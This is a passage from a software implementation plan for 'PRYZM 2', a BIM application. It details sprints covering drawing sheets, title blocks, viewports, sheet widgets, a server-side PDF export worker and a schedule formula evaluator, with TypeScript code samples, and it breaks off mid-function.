# Phase 2C — Sheets, Schedules & Documentation Pipeline
## Q3 of Phase 2 · Months 19–21 · Sprints S37–S42

> **Strategic anchor**: subordinate to `08-VISION.md` → `10-MASTER-IMPLEMENTATION-PLAN-36M.md` → this file.
> Conflict order: `06-PRYZM-IDENTITY-AND-RECOUNT.md` → `08-VISION.md` → `10-MASTER…` → this doc.

---

## Executive Summary

**Sub-phase goal**: By end of M21, the full PRYZM 2 documentation pipeline is operational — sheet layout with title blocks and viewports, 10 widget types, PDF export, schedules with formula evaluation, and export to CSV/XLSX/PDF. This closes the documentation capability gap with PRYZM 1 and establishes the technical infrastructure (export worker) that the M24 beta launch requires.

**The documentation pipeline**: in BIM software, "documentation" means the set of deliverables that leave the software — drawing sheets sent to contractors, schedules sent to quantity surveyors, PDFs filed for building consent. PRYZM 2's documentation pipeline is a competitive differentiator because it operates without the legacy `SheetEditorPanel.ts` (2,919 LOC) and `ScheduleStore.ts` (~460 LOC) monoliths — it uses the clean plugin architecture established in Phase 1.

**Why 2C comes after 2B**: sheets and schedules reference views (plan view, section view) as viewports on sheets. These views did not exist until 2B was complete. The dependency order is: 3D views (Phase 1) → plan view (2B) → section view (2B) → sheets (2C, which can embed any of the above as viewports).

**The two hardest problems in 2C**:
1. **PDF export** (S40) — rasterising a sheet to PDF at print resolution (300 DPI) requires rendering every viewport at full quality (the same `CanvasHost` that renders in the editor, but at 300 DPI rather than 96 DPI). The export runs in a server-side worker (`apps/export-worker`), which means the `PlanViewCanvasHost` and `SceneCommitter` must run headlessly in Node. This is the second time `@pryzm/headless` (from Phase 1C) is tested in a new server context.
2. **Formula evaluator** (S41) — the schedule formula DSL (`SUM`, `COUNT`, `GROUP`, `FILTER`, `IF`) must be a pure function that operates on the live element store state. Getting the formula evaluation semantics right (reference updating when elements change, circular dependency detection) is the mathematical challenge of 2C.

---

## §0 Reading Conventions

**Export worker pattern**: S40 introduces a new server-side worker (`apps/export-worker`) that follows the same BullMQ + `worker_threads` pattern as the bake worker (Phase 1D S21). The same ADR-005 (Worker pool policy) applies. Any new server-side worker added in Phase 2 must follow ADR-005 — no exceptions.

**Schedule formula semantics**: the formula evaluator is a pure function operating on snapshot data. It does NOT re-execute when element stores change — instead, the schedule view subscribes to element stores and calls `evaluateFormulas(snapshot)` on every dirty signal. This is the same demand-driven pattern as the geometry producers.

---

## §1 Track Allocation for 2C

### Track A — Stores, Handlers, Formula Logic (Agent A)

| Item | Sprint |
|---|---|
| `packages/stores/SheetStore.ts` + 4 handlers | S37 |
| `packages/stores/TitleBlockStore.ts` + handlers | S38 |
| `apps/export-worker/` skeleton + PDF job | S40 |
| `packages/stores/ScheduleStore.ts` + 6 handlers | S41 |
| `plugins/schedules/formula-evaluator.ts` | S41 |
| `plugins/schedules/export/{csv,xlsx}.ts` | S42 |
| `apps/export-worker/jobs/ScheduleExportJob.ts` | S42 |

### Track B — UI, Rendering, Export Pipeline (Agent B)

| Item | Sprint |
|---|---|
| `plugins/sheets/sheet-editor-host.ts` | S37 |
| `plugins/sheets/sheet-list.ts` | S37 |
| `plugins/sheets/viewport.ts` | S38 |
| `plugins/sheets/title-block.ts` | S38 |
| `plugins/sheets/widgets/*.ts` (10 types) | S39 |
| `plugins/sheets/widget-tool-palette.ts` | S39 |
| `plugins/sheets/export/pdf.ts` (client orchestration) | S40 |
| `apps/bench/export-pdf.ts` | S40 |
| `plugins/schedules/view.ts` — table view | S41 |
| `plugins/schedules/import/csv.ts` | S42 |

### Joint Deliverables

| Item | Sprint |
|---|---|
| ADR-026 — Export worker architecture (BullMQ, headless rasterise, pdf-lib) | S40 D1 |
| ADR-027 — Schedule formula DSL semantics | S41 D1 |
| 2C demo recording (8-min screencast) | S42 D9 |
| `apps/bench/reports/M21-2C.md` | S42 D9 |

---

## §2 Sprint-by-Sprint Detail

---

### S37 — Sheet Store + Sheet Editor Host
**Weeks 73–74 (Month 19)**

---

#### Context and Why This Matters

Sheets are the top-level document unit in PRYZM 2 — a sheet holds viewports (views embedded at scale), title blocks, and freehand annotation widgets. The `SheetStore` defines what sheets exist and what they contain. The `sheet-editor-host.ts` is a `CanvasHost` subclass (like plan view) that renders the sheet as a 2D canvas.

The critical design question is: should the sheet editor use Canvas2D or WebGL? The answer is **Canvas2D** — for the same reasons as the plan view. Sheets are 2D documents; WebGL adds complexity without benefit; Canvas2D is headless-compatible (runs in Node via `node-canvas`) for PDF export.

---

#### Implementation Detail — `SheetStore.ts`

```typescript
// packages/stores/SheetStore.ts

export interface ViewportDto {
  id: string;
  viewId: string;         // ID of the 3D, plan, or section view being embedded
  x: number;             // position on sheet (metres from sheet origin)
  y: number;
  width: number;         // viewport width on sheet (metres)
  height: number;
  scale: number;         // drawing scale (e.g. 50 = 1:50)
  clippingBox?: { x: number; y: number; width: number; height: number }; // crops the view
}

export interface SheetDto {
  id: SheetId;
  name: string;
  number: string;          // e.g. 'A-001'
  size: 'A0' | 'A1' | 'A2' | 'A3' | 'A4' | 'ARCH-D' | 'ARCH-E';
  orientation: 'landscape' | 'portrait';
  titleBlockId: string;
  viewports: ViewportDto[];
  widgets: WidgetDto[];     // non-viewport sheet content
  revision: string;
  issue: string;
  approvedBy?: string;
}

export interface SheetListState {
  sheets: ReadonlyArray<SheetDto>;
  activeSheetId: string | null;
}

// 4 handlers in S37: CreateSheet, DeleteSheet, RenameSheet, ReorderSheet.
// 7 more handlers in S38–S39: AddViewport, RemoveViewport, SetViewportScale,
//   SetTitleBlock, SetSheetMetadata, AddWidget, RemoveWidget.
```

**Sheet coordinate system**: the sheet coordinate system uses millimetres from the sheet's bottom-left corner. A1 paper = 594 mm × 841 mm. Viewports are positioned in mm and have a `scale` factor (e.g. `scale = 50` means 1 mm on sheet = 50 mm in world space = 1:50).

**Sheet persistence**: sheets are stored in `SheetStore`, which is a domain store like `WallStore`. Every `AddViewport`, `SetScale`, `AddWidget` command is an event in the event log — sheets are fully undoable and persist via the same event-log mechanism.

---

#### Implementation Detail — `sheet-editor-host.ts`

```typescript
// plugins/sheets/sheet-editor-host.ts

import { CanvasHost } from '@pryzm/ui/CanvasHost';

export class SheetEditorHost extends CanvasHost {
  private canvas: HTMLCanvasElement;
  private ctx: CanvasRenderingContext2D;
  private camera: SheetCamera; // pan/zoom for the sheet editor (similar to PlanCamera)

  constructor(
    container: HTMLElement,
    private scheduler: FrameScheduler,
    private sheetStore: SheetStore,
    private viewRegistry: ViewRegistry, // to render embedded view thumbnails
    private titleBlockStore: TitleBlockStore,
  ) {
    super();
    this.canvas = document.createElement('canvas');
    this.ctx = this.canvas.getContext('2d', { alpha: false })!;
    container.appendChild(this.canvas);
    this.camera = new SheetCamera(this.canvas);
    this.camera.onDirty = () => this.scheduler.requestFrame('sheet-editor-camera');

    // Subscribe to sheet changes.
    sheetStore.subscribeDirty(() => this.scheduler.requestFrame('sheet-content-change'));
    viewRegistry.onViewUpdated(() => this.scheduler.requestFrame('sheet-view-update'));

    scheduler.onFrame('sheet-editor-render', this.render.bind(this), 'interactive');
  }

  private render(): void {
    const { ctx } = this;
    const activeSheet = this.sheetStore.getActiveSheet();
    if (!activeSheet) {
      this.renderEmptyState(ctx);
      return;
    }

    ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
    ctx.save();
    this.camera.applyTransform(ctx);

    // 1. Sheet boundary (paper background).
    const { widthMm, heightMm } = getSheetDimensions(activeSheet.size, activeSheet.orientation);
    ctx.fillStyle = '#FFFFFF';
    ctx.fillRect(0, 0, widthMm, heightMm);
    ctx.strokeStyle = '#000';
    ctx.lineWidth = 0.5;
    ctx.strokeRect(0, 0, widthMm, heightMm);

    // 2. Viewports.
    for (const vp of activeSheet.viewports) {
      this.renderViewport(ctx, vp);
    }

    // 3. Title block.
    this.renderTitleBlock(ctx, activeSheet, widthMm, heightMm);

    // 4. Widgets.
    for (const widget of activeSheet.widgets) {
      this.renderWidget(ctx, widget);
    }

    ctx.restore();
  }

  private renderViewport(ctx: CanvasRenderingContext2D, vp: ViewportDto): void {
    // Draw a thumbnail of the referenced view, clipped to the viewport bounds.
    // In the editor: draw a cached thumbnail (low-res, fast).
    // For PDF export: draw at full 300 DPI resolution (handled by export worker).
    ctx.save();
    ctx.beginPath();
    ctx.rect(vp.x, vp.y, vp.width, vp.height);
    ctx.clip();

    const thumbnail = this.viewRegistry.getThumbnail(vp.viewId);
    if (thumbnail) {
      ctx.drawImage(thumbnail, vp.x, vp.y, vp.width, vp.height);
    } else {
      // Placeholder while thumbnail is generating.
      ctx.fillStyle = '#F0F0F0';
      ctx.fillRect(vp.x, vp.y, vp.width, vp.height);
      ctx.fillStyle = '#999';
      ctx.font = '4px sans-serif';
      ctx.fillText('Loading view…', vp.x + 4, vp.y + 8);
    }

    // Viewport border.
    ctx.restore();
    ctx.strokeStyle = '#000';
    ctx.lineWidth = 0.5;
    ctx.strokeRect(vp.x, vp.y, vp.width, vp.height);

    // Scale label (e.g. "1:50").
    ctx.font = '3px sans-serif';
    ctx.fillStyle = '#000';
    ctx.fillText(`1:${vp.scale}`, vp.x + 2, vp.y + vp.height - 2);
  }

  dispose(): void {
    this.canvas.remove();
    this.camera.dispose();
  }
}
```

**Low-res thumbnails in the editor**: the sheet editor displays low-resolution (512 × 512 px) cached thumbnails of each view — plan, section, or 3D. The thumbnail is generated by the bake worker (S28 extended it for project thumbnails; the same mechanism generates per-view thumbnails). The full-resolution render for PDF export is done by the export worker in S40.

---

#### D1 — Kickoff (30 min)

- A: present `SheetDto` schema — all fields, size enum (A0–A4 + ARCH-D/ARCH-E), orientation, revision tracking.
- B: confirm the sheet editor's coordinate system — mm units on paper. The `SheetCamera` uses `pixelsPerMm` as the zoom unit (default: 2 px/mm = approximately 1:5 screen scale for A3 sheet).
- Agree: the sheet editor is a Canvas2D host, not THREE — same as plan view.

#### D2–D8 Parallel Work

| Day | Agent A (Store + Logic) | Agent B (UI + Rendering) |
|---|---|---|
| D2 | `SheetStore` Zod schema + state + `reduce` for 4 handlers. `SheetListStore.activeSheetId` controls which sheet the editor displays. | `SheetEditorHost` skeleton — canvas + camera + empty state render ("No sheet selected — click + to create"). |
| D3 | 4 handlers: `CreateSheet`, `DeleteSheet`, `RenameSheet`, `ReorderSheet`. Each with `produceWithPatches`. | `SheetList` sidebar — list of sheets with number/name, reorder drag, add/delete buttons. |
| D4 | Wire `SheetStore` to sync server: sheet commands linearised as events (same as element commands). | `SheetEditorHost` renders paper boundary + "Loading view" placeholder for empty viewports. |
| D5 | **Mid-sprint sync (1 h)** — end-to-end: create sheet → appears in list → click to open → sheet canvas renders paper boundary. | Same session — confirm camera pan/zoom, paper boundary renders at correct aspect ratio for A0–A4. |
| D6 | Sheet persistence: create 3 sheets, hard-reload, confirm all 3 still exist (events in log, `SheetStore` hydrated on load). | Sheet navigation: click sheet in list → `SheetStore.activeSheetId` updates → editor re-renders new sheet. |
| D7 | Sheet number formatting: ensure A-001, A-002, etc. auto-incremented on creation; user can override. | `docs/04-reference/architecture-detail/sheet-editor.md` — Canvas2D approach, coordinate system, thumbnail strategy. |
| D8 | OTel: `pryzm.sheet.create`, `pryzm.sheet.activate`, `pryzm.sheet.render` spans. | E2E Playwright test: create sheet → rename → reorder → delete → confirm list updates. |

#### S37 Exit Criteria

- [ ] Create/delete/rename/reorder sheets functional; list navigable.
- [ ] Sheet editor renders paper boundary at correct size for each paper size.
- [ ] Sheets persist via event log (hard-reload restores all sheets).
- [ ] `pryzm.sheet.create`, `pryzm.sheet.render` OTel spans visible.
- [ ] `plugins/sheets/README.md` committed.

---

### S38 — Title Blocks + Viewports
**Weeks 75–76 (Month 19–20)**

---

#### Context and Why This Matters

S38 is the sprint where sheets become **professional drawing sheets**: title blocks carry the project metadata (name, number, date, revision, approved-by), and viewports embed the plan view, section view, and 3D view at the correct scale. This combination (title block + viewport + correct scale) is the deliverable that architects and engineers send to contractors and building consent authorities.

**Why viewport scale is critical**: a 1:50 plan view on an A1 sheet means every 20 mm on paper represents 1 m in the building. If the scale is wrong by even 1%, dimensions read from the printed sheet will be wrong — a significant professional liability. The viewport scale must be exact (integer ratio, e.g. 50, 100, 200) and must be reflected in the on-sheet scale label.

---

#### Implementation Detail — Viewport Rendering at Scale

The `viewport.ts` must render the embedded view at the correct scale. For the editor (screen preview), this is a thumbnail. For PDF export, it is a full-resolution rasterise:

```typescript
// plugins/sheets/viewport.ts

export class ViewportManager {
  private dragTarget: ViewportDto | null = null;

  constructor(
    private sheetStore: SheetStore,
    private commandBus: CommandBus,
    private viewRegistry: ViewRegistry,
  ) {}

  // User drags a view from the view list panel onto the sheet canvas.
  handleDropView(viewId: string, sheetX: number, sheetY: number): void {
    const defaultScale = 50; // 1:50 default
    const defaultWidth = 100; // 100mm wide
    const defaultHeight = 80; // 80mm tall

    this.commandBus.execute({
      command: 'sheet.addViewport',
      payload: {
        viewId,
        x: sheetX,
        y: sheetY,
        width: defaultWidth,
        height: defaultHeight,
        scale: defaultScale,
      },
    });
  }

  // Called from SheetEditorHost to get the world bounds of a viewport.
  // Used by the PDF export rasteriser to know what world region to render.
  getViewportWorldBounds(vp: ViewportDto): WorldBounds2D {
    const view = this.viewRegistry.get(vp.viewId);
    const worldWidth = vp.width * vp.scale;   // mm on sheet × scale → mm in world
    const worldHeight = vp.height * vp.scale;
    const worldCenter = view.getCenter(); // camera target at time of viewport creation

    return {
      centerX: worldCenter.x,
      centerZ: worldCenter.z,
      widthM: worldWidth / 1000,  // convert mm to m
      heightM: worldHeight / 1000,
    };
  }
}
```

---

#### Implementation Detail — Title Block Templates

```typescript
// plugins/sheets/title-block.ts

export interface TitleBlockField {
  key: string;          // e.g. 'projectName', 'drawnBy', 'date', 'revision'
  label: string;        // e.g. 'Project Name'
  value: string;        // filled from project metadata or manual entry
  x: number;            // position within title block (mm)
  y: number;
  width: number;
  fontSize: number;
  fontWeight: 'normal' | 'bold';
}

export interface TitleBlockTemplate {
  id: string;
  name: string;
  fields: TitleBlockField[];
  logoArea?: { x: number; y: number; width: number; height: number };
  borderLines: Array<{ start: Vec2; end: Vec2; lineWeight: number }>;
}

export function renderTitleBlock(
  ctx: CanvasRenderingContext2D,
  template: TitleBlockTemplate,
  projectMeta: ProjectMetadata,
  sheet: SheetDto,
  x: number,   // title block position on sheet (mm)
  y: number,
  width: number,
  height: number,
): void {
  ctx.save();
  ctx.translate(x, y);

  // Draw border lines.
  for (const line of template.borderLines) {
    ctx.beginPath();
    ctx.strokeStyle = '#000';
    ctx.lineWidth = line.lineWeight;
    ctx.moveTo(line.start[0], line.start[1]);
    ctx.lineTo(line.end[0], line.end[1]);
    ctx.stroke();
  }

  // Fill text fields with project/sheet metadata.
  for (const field of template.fields) {
    const value = resolveFieldValue(field.key, projectMeta, sheet);
    ctx.font = `${field.fontWeight} ${field.fontSize}px Inter, sans-serif`;
    ctx.fillStyle = '#000';
    ctx.fillText(value, field.x, field.y);
  }

  ctx.restore();
}

function resolveFieldValue(key: string, meta: ProjectMetadata, sheet: SheetDto): string {
  const map: Record<string, string> = {
    projectName:   meta.name,
    projectNumber: meta.number,
    drawnBy:       meta.drawnBy,
    checkedBy:     meta.checkedBy,
    date:          new Date().toISOString().slice(0, 10),
    revision:      sheet.revision,
    sheetNumber:   sheet.number,
    sheetName:     sheet.name,
    scale:         sheet.viewports[0] ? `1:${sheet.viewports[0].scale}` : '—',
    approved:      sheet.approvedBy ?? '—',
    issued:        sheet.issue,
  };
  return map[key] ?? `[${key}]`;
}
```

**PRYZM 2 ships 3 built-in title block templates**: "Standard" (ISO 128-21 compliant border), "Architectural" (landscape A1/A0 bias), and "Minimal" (compact, for sketch sheets). Custom templates are a Plugin SDK S62 feature.

---

#### S38 Exit Criteria

- [ ] Viewports drag-and-drop from view list onto sheet; correct scale label displayed.
- [ ] Title block renders all metadata fields correctly.
- [ ] 3 built-in title block templates functional.
- [ ] Viewport scale is exact (verified: measure a known wall on the exported sheet image).
- [ ] `AddViewport`, `SetViewportScale`, `SetTitleBlock`, `SetSheetMetadata` handlers operational.
- [ ] Parity test: `tests/parity/sheets/viewport-scale.test.ts` — 5 scale values (1:50, 1:100, 1:200, 1:500, 1:1000) all exact.

---

### S39 — Sheet Widgets (10 Types)
**Weeks 77–78 (Month 20)**

---

#### Context and Why This Matters

Sheet widgets are the non-viewport content that makes a drawing sheet complete: text blocks, north arrows, scale bars, legends, revision tables, BIM tags, line/region annotation. PRYZM 1's `SheetEditorPanel.ts` contains all widget logic inline (one of its 2,919 LOC). Phase 2C decomposes this into 10 separate `Widget` classes, each < 200 LOC.

The widget palette (drag-from-palette onto sheet) is a vanilla TS component similar to the furniture carousel from S27.

---

#### Implementation Detail — Widget Base Class and Sample Widgets

```typescript
// plugins/sheets/widgets/base.ts

export abstract class Widget {
  abstract readonly type: string;
  abstract render(ctx: CanvasRenderingContext2D, dto: WidgetDto): void;
  abstract getBounds(dto: WidgetDto): { x: number; y: number; width: number; height: number };
}

// plugins/sheets/widgets/NorthArrow.ts
export class NorthArrowWidget extends Widget {
  readonly type = 'north-arrow';

  render(ctx: CanvasRenderingContext2D, dto: WidgetDto): void {
    const { x, y, size = 10, rotation = 0 } = dto.props as NorthArrowProps;
    ctx.save();
    ctx.translate(x + size / 2, y + size / 2);
    ctx.rotate((rotation * Math.PI) / 180);

    // Draw a classic compass rose north arrow.
    ctx.beginPath();
    ctx.moveTo(0, -size / 2);         // North tip
    ctx.lineTo(size / 6, 0);
    ctx.lineTo(0, size / 4);
    ctx.lineTo(-size / 6, 0);
    ctx.closePath();
    ctx.fillStyle = '#000';
    ctx.fill();

    // "N" label above tip.
    ctx.font = `bold ${size / 4}px sans-serif`;
    ctx.textAlign = 'center';
    ctx.fillText('N', 0, -size / 2 - 2);
    ctx.restore();
  }

  getBounds(dto: WidgetDto) {
    const { x, y, size = 10 } = dto.props as NorthArrowProps;
    return { x, y, width: size, height: size + 4 };
  }
}

// plugins/sheets/widgets/ScaleBar.ts
export class ScaleBarWidget extends Widget {
  readonly type = 'scale-bar';

  render(ctx: CanvasRenderingContext2D, dto: WidgetDto): void {
    const { x, y, scaleRatio, widthMm = 50, unit = 'm' } = dto.props as ScaleBarProps;
    const worldUnits = (widthMm / 1000) * scaleRatio; // metres shown by the bar

    // Draw alternating black/white segments.
    const segments = 5;
    const segWidth = widthMm / segments;
    for (let i = 0; i < segments; i++) {
      ctx.fillStyle = i % 2 === 0 ? '#000' : '#FFF';
      ctx.fillRect(x + i * segWidth, y, segWidth, 4);
    }
    // Border.
    ctx.strokeStyle = '#000';
    ctx.lineWidth = 0.3;
    ctx.strokeRect(x, y, widthMm, 4);
    // Labels.
    ctx.font = '3px sans-serif';
    ctx.fillStyle = '#000';
    ctx.fillText('0', x, y + 7);
    ctx.fillText(`${worldUnits} ${unit}`, x + widthMm, y + 7);
  }

  getBounds(dto: WidgetDto) {
    const { x, y, widthMm = 50 } = dto.props as ScaleBarProps;
    return { x, y: y - 2, width: widthMm, height: 12 };
  }
}
```

The 10 widget types and their complexity:

| Widget | Complexity | Key Challenge |
|---|---|---|
| `TextWidget` | Low | Multi-line text with wrapping within a bounding box |
| `ImageWidget` | Medium | Embed R2-hosted images (logos, company branding) |
| `NorthArrowWidget` | Low | Compass rose, rotation from true north |
| `ScaleBarWidget` | Low | Scale ratio from active viewport |
| `LegendWidget` | Medium | Dynamic: reads element types + materials from the model |
| `RevisionsTableWidget` | Medium | Tabular; rows grow dynamically |
| `ScheduleSnapshotWidget` | High | Embeds a live schedule (mini-table, read from `ScheduleStore`) |
| `BimTagWidget` | Medium | Tags a viewport element with a text balloon |
| `LineWidget` | Low | Freehand line annotation |
| `RegionWidget` | Low | Filled/hatched rectangle or polygon |

---

#### S39 Exit Criteria

- [ ] All 10 widget types render correctly on sheets.
- [ ] Widget palette UI: drag from palette → place on sheet.
- [ ] Parity tests: `tests/parity/sheet-widgets/` — 30-case fixture green.
- [ ] `AddWidget`, `RemoveWidget` handlers operational.
- [ ] `LegendWidget` reads element types dynamically from model.
- [ ] `ScheduleSnapshotWidget` reads from `ScheduleStore` (pre-wired even if S41 isn't done).

---

### S40 — PDF Export
**Weeks 79–80 (Month 20–21)**

---

#### Context and Why This Matters

PDF export is the moment the documentation pipeline is real. Until S40, all the work in 2C produces content that lives in the PRYZM 2 editor. After S40, that content can be exported as a PDF that opens in Acrobat, is sent to a contractor, and is filed with a building consent authority.

**The technical challenge**: PDF export requires rendering every sheet at **print resolution** (300 DPI). A standard A1 sheet at 300 DPI = `(841 × 594 mm) × (300/25.4 px/mm)` = 9,921 × 7,016 px = ~70 MP per sheet. This is not renderable in the browser's main thread (too much memory, too long). The export worker (a Node process) must render each sheet offscreen at full resolution and assemble the PDF using `pdf-lib`.

**ADR-026 decision**: the export worker renders sheets using `node-canvas` (Cairo-backed Canvas2D, exactly API-compatible with browser Canvas2D). The same `SheetEditorHost.render()` code path runs in Node as in the browser. This is possible **because** we chose Canvas2D instead of WebGL for sheets — WebGL cannot run in Node without additional GPU mocking.

---

#### Implementation Detail — `apps/export-worker/`

```typescript
// apps/export-worker/index.ts

import express from 'express';
import { Queue, Worker } from 'bullmq';
import { createClient } from 'ioredis';
import { PdfExportJob, processExportJob } from './jobs/PdfExportJob';

const redis = createClient({ url: process.env.REDIS_URL! });
const exportQueue = new Queue<PdfExportJob>('export-jobs', { connection: redis });

const worker = new Worker<PdfExportJob>('export-jobs', async (job) => {
  return await processExportJob(job.data);
}, { connection: redis, concurrency: 2 }); // PDF rendering is CPU-heavy; limit concurrency

worker.on('completed', (job, result) => {
  console.log(`Export job ${job.id} done: ${result.signedUrl} (${result.durationMs} ms)`);
});

const app = express();
app.use(express.json());

// Called by editor when user clicks "Export PDF".
app.post('/export/pdf', async (req, res) => {
  const { projectId, sheetIds, quality = 'print' } = req.body;
  const job = await exportQueue.add('pdf-export', { projectId, sheetIds, quality });
  res.json({ ok: true, jobId: job.id });
});

// Polling endpoint for the client to check export status.
app.get('/export/status/:jobId', async (req, res) => {
  const job = await exportQueue.getJob(req.params.jobId);
  if (!job) return res.status(404).json({ error: 'Job not found' });
  const state = await job.getState();
  const result = job.returnvalue;
  res.json({ state, result });
});

app.listen(parseInt(process.env.EXPORT_PORT ?? '4002', 10));
```

---

#### Implementation Detail — `apps/export-worker/jobs/PdfExportJob.ts`

```typescript
// apps/export-worker/jobs/PdfExportJob.ts

import { createCanvas } from 'canvas'; // node-canvas
import { PDFDocument, rgb } from 'pdf-lib';
import { createHeadlessSession } from '@pryzm/headless';
import { SheetEditorHostNode } from './SheetEditorHostNode';
import { R2Storage } from '../storage/r2';

export interface PdfExportJob {
  projectId: string;
  sheetIds: string[];
  quality: 'screen' | 'print'; // screen = 96 DPI, print = 300 DPI
}

export async function processExportJob(job: PdfExportJob, r2: R2Storage): Promise<{ signedUrl: string; durationMs: number }> {
  const t0 = performance.now();
  const session = createHeadlessSession();

  // 1. Load the project into the headless session.
  const chunkBytes = await r2.get(await session.getLatestChunkHash(job.projectId));
  await session.persistence.loadFromChunk(chunkBytes, 'all');

  // 2. Create a PDF document.
  const pdfDoc = await PDFDocument.create();
  pdfDoc.setTitle(session.stores.get('project').getSnapshot().name);
  pdfDoc.setAuthor('PRYZM 2');
  pdfDoc.setCreator('PRYZM 2 Export Worker');

  // 3. Render each sheet to a canvas and add to PDF.
  const dpi = job.quality === 'print' ? 300 : 96;
  const pxPerMm = dpi / 25.4;

  const sheets = job.sheetIds.map(id => session.stores.get('sheet').getSnapshot().sheets.find(s => s.id === id)!);

  for (const sheet of sheets) {
    const { widthMm, heightMm } = getSheetDimensions(sheet.size, sheet.orientation);
    const canvasWidth = Math.round(widthMm * pxPerMm);
    const canvasHeight = Math.round(heightMm * pxPerMm);

    const nodeCanvas = createCanvas(canvasWidth, canvasHeight);
    const ctx = nodeCanvas.getContext('2d');

    // Render the sheet using the same logic as the browser SheetEditorHost.
    // `SheetEditorHostNode` is a thin Node-compatible wrapper.
    const hostNode = new SheetEditorHostNode(ctx as unknown as CanvasRenderingContext2D, session, pxPerMm);
    hostNode.renderSheet(sheet);

    // Convert canvas to PNG bytes and embed in PDF.
    const pngBytes = nodeCanvas.toBuffer('image/png');
    const pngImage = await pdfDoc.embedPng(pngBytes);

    // Add page to PDF with correct dimensions.
    const page = pdfDoc.addPage([widthMm * 2.8346, heightMm * 2.8346]); // mm → PDF points (1 mm = 2.8346 pt)
    page.drawImage(pngImage, { x: 0, y: 0, width: page.getWidth(), height: page.getHeight() });

    // Add PDF bookmarks per sheet.
    // (pdf-lib bookmark API: pdfDoc.getOutlines().push(...))
  }

  // 4. Save and upload to R2.
  const pdfBytes = await pdfDoc.save();
  const hash = await computeSHA256(pdfBytes);
  await r2.put(`exports/${job.projectId}/${hash}.pdf`, new Uint8Array(pdfBytes));
  const signedUrl = await r2.getSignedUrl(`exports/${job.projectId}/${hash}.pdf`, 3600);

  session.dispose();
  return { signedUrl, durationMs: performance.now() - t0 };
}
```

**The `SheetEditorHostNode` class**: this is a thin wrapper that re-uses the browser `SheetEditorHost`'s `render()` logic but operates on a `node-canvas` `CanvasRenderingContext2D` instead of a browser canvas. The browser and Node Canvas2D APIs are identical, so no code duplication is needed — `SheetEditorHostNode` simply constructs the host with the node-canvas context.

**PDF quality targets**:
- 5-sheet A1 drawing set at 300 DPI: < 30 s export time.
- 20-sheet A1 drawing set at 300 DPI: < 120 s export time (2 concurrent workers × 60 s each).

---

#### D1 — Kickoff (30 min)

- A: present ADR-026. Key decisions: `node-canvas` for headless rendering (agreed); `pdf-lib` for PDF assembly (agreed over `pdfmake` because `pdf-lib` supports image embedding from `Uint8Array` directly); BullMQ reuse from bake worker (agreed).
- B: confirm the `SheetEditorHostNode` abstraction — the browser `SheetEditorHost` must be refactored so the rendering logic is in a `renderSheetToContext(ctx, sheet)` function usable from both browser and Node.
- Both: agree the `renderSheetToContext` refactor is a D2 joint task before any PDF export code is written.

#### D2–D8 Parallel Work

| Day | Agent A (Worker + Pipeline) | Agent B (Client + Bench) |
|---|---|---|
| D2 | **Joint: refactor `SheetEditorHost`** — extract `renderSheetToContext(ctx, sheet, session)` as a pure render function usable in browser and Node. Test in Node with `node-canvas`: small sheet renders without error. | Same joint task. |
| D3 | `apps/export-worker/` skeleton — Express + BullMQ + R2 storage. Smoke test: `POST /export/pdf` → job enqueued → `GET /export/status/:jobId` returns `waiting`. | Client-side: "Export PDF" button in sheet editor → `POST /export/pdf` → polling → download when done. |
| D4 | `PdfExportJob` implementation — load headless session → render each sheet to `node-canvas` → embed in `pdf-lib` document → upload to R2. | Status polling UI: progress bar during export; "Download" button when complete. |
| D5 | **Mid-sprint sync (1 h) — mandatory end-to-end test** — export 1-sheet drawing set. Open resulting PDF in Acrobat. Visually verify: scale bar correct, title block fields populated, viewport scale correct, annotations readable. | Same session — measure export time for 1 sheet. Target: < 8 s (well within the 30-s budget for 5 sheets). |
| D6 | PDF bookmarks: add a bookmark per sheet (sheet number + name) for navigation in Acrobat. | Bench: `apps/bench/export-pdf.ts` — 5-sheet, 20-sheet, 50-sheet. Measure p50 and p95. |
| D7 | Error handling: malformed sheet (no viewports, no title block) → export produces a valid PDF with a "No content" placeholder — never crashes the worker. | OTel: `pryzm.export.pdf.rasterise`, `pryzm.export.pdf.assemble`, `pryzm.export.pdf.upload` spans. |
| D8 | E2E test: create 5 sheets → add viewports + title blocks + 3 widgets → export PDF → verify in Playwright (download, page count = 5, file size < 50 MB). | `docs/04-reference/architecture-detail/export-worker.md` — architecture, job lifecycle, quality settings, cost (R2 + compute). |

#### S40 Exit Criteria

- [ ] 5-sheet A1 drawing set exports to PDF in **< 30 s** (CI gate: `apps/bench/export-pdf.ts`).
- [ ] PDF opens correctly in Acrobat: correct page count, correct page sizes, bookmarks present.
- [ ] Viewports render at correct scale (visual inspection + scale bar verification).
- [ ] Title block metadata fields all populated correctly.
- [ ] ADR-026 merged.
- [ ] `apps/export-worker/` starts cleanly with `docker-compose up`.
- [ ] OTel spans covering the full export pipeline.

**Kill-switch K2C-1**: if 5-sheet export takes > 60 s at D5, halt and investigate. Most likely cause: `node-canvas` render time per sheet is O(elements) without spatial culling. Fix: add spatial culling to `renderSheetToContext` (render only elements within the viewport bounds). This will immediately reduce render time for large models with many off-sheet elements.

---

### S41 — Schedule Store + Schedule View
**Weeks 81–82 (Month 21)**

---

#### Context and Why This Matters

Schedules are the tabular counterpart to drawings — they quantify and categorise BIM elements into tables (door schedule, wall schedule, room schedule). PRYZM 2's schedule system is driven by a pure formula evaluator that computes schedule rows from the live element store state. This makes schedules **reactive** — add a new door → the door schedule automatically gains a new row. Delete a wall type → the wall schedule removes its row.

**ADR-027 — Schedule Formula DSL semantics**:
- Formulas operate on **snapshot data** (the stores' current state at the time of evaluation).
- There is no incremental update — the full schedule is re-evaluated on every dirty signal. For typical projects (< 500 elements of any type), this is < 5 ms.
- For large projects (> 2,000 elements of one type), incremental evaluation becomes necessary. The architecture supports this via a `memoize(rowId, hash)` wrapper, but it is not activated until Phase 3 performance hardening.
- Circular dependency detection: if formula A references formula B which references formula A, evaluation terminates with an error cell ("CIRCULAR REF").

---

#### Implementation Detail — Formula Evaluator

```typescript
// plugins/schedules/formula-evaluator.ts

export type FormulaResult = string | number | boolean | null;

export interface ScheduleColumn {
  id: string;
  header: string;
  formula: string; // e.g. 'COUNT', 'SUM(width * height)', 'IF(type == "WD01", "Internal", "External")'
  type: 'number' | 'string' | 'boolean';
  unit?: string;   // 'm', 'm²', 'ea', etc.
}

export interface ScheduleRow {
  elementId: string;
  cells: Record<string, FormulaResult>; // columnId → computed value
}

export function evaluateSchedule(
  columns: ScheduleColumn[],
  elements: AnyElementDto[],
  groupBy?: string, // if set, group rows by this field value
): ScheduleRow[] {
